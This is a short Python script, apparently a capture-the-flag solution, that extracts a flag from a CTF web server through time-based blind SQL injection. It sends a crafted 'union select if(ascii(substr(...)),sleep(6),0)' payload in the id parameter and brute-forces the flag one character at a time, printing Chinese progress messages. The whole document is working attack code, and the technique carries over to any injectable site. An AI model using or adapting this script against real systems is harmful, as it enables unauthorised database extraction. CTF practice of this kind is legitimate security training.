import requests
def judge(index,guess):
    url1="http://0.ctf.rois.io:20009/?id=1%20union%20select%20if(ascii(substr((select%20flag%20from%20flag),"
    url2=",1))%3d"
    url3=',sleep(6),0)#'
    rurl=url1+str(index)+url2+str(guess)+url3
    try :
        requests.get(rurl,timeout=6)
        print('第'+str(index)+'字母不是'+chr(guess))
        return 0
    except requests.exceptions.ReadTimeout:
        print('success,'+'第'+str(index)+'字母是'+chr(guess))
        return 1
    

result='ROIS'
index=1+4
while 1:
    alpha=0
    
    for i in range(32,128):
        if judge(index,i):
            alpha=i
            result+=chr(i)
            break
    if alpha==0:
        print('爆破完成:'+result)
        break
    index+=1